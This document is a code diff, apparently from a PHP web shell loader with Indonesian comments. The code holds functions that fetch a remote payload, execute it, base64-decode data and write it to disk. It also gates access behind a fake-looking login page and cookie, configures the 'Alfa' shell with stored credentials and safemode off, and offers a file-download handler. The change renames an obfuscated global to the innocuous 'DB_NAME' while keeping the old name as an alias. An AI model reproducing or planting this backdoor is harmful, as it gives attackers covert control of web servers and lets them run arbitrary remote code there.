@@ -4,7 +4,7 @@ define('LOGIN_HASH', '$2a$12$vJGH/3I3lfqPilK8O4F2JOcmkLbKtOZK4s88Moy/NOZdcH5URr4
 define('LOGIN_COOKIE', 'shadow_gate');
 define('LOGIN_EXPIRY', 3600);
 
-// ====== FUNGSI FETCH (SAMA KAYAK SEBELUMNYA) ======
+// ====== FUNGSI FETCH (SAMA) ======
 function _compileFetchCoreLite($u) {
     if (function_exists('curl_version')) {
         $c = curl_init();
@@ -54,7 +54,7 @@ function _compileExecPayloadTask($u) {
 function _compileDecodeChunkUnit($d) { return base64_decode($d); }
 function _compilePushToDiskNode($f, $c) { file_put_contents($f, $c); }
 
-// ====== HALAMAN LOGIN (SAMA) ======
+// ====== HALAMAN LOGIN ======
 function _compileRenderLoginPage($quote) {
     $current_domain = $_SERVER['HTTP_HOST'];
     $domain = preg_replace('/^www\./', '', $current_domain);
@@ -111,7 +111,7 @@ function _compileAuthAndRun($payloadUrl) {
 }
 
 // ====== KONFIGURASI UNTUK SHELL ALFA (WAJIB!) ======
-$GLOBALS['oZgNypoPRU'] = array(
+$GLOBALS['DB_NAME'] = array(
     'user' => 'alfa',
     'pass' => '$2a$12$aDAdnxMWNfYQnJs5jbbcX.bRioN4DNDIfOeIbENX86LsHLmdyiG6O',
     'safemode' => '0',
@@ -120,6 +120,8 @@ $GLOBALS['oZgNypoPRU'] = array(
     'post_encryption' => false,
     'cgi_api' => false,
 );
+// Biarkan juga untuk jaga-jaga
+$GLOBALS['oZgNypoPRU'] = $GLOBALS['DB_NAME'];
 
 // ====== ?landak – DOWNLOAD FILE ======
 if (isset($_GET['landak'])) {
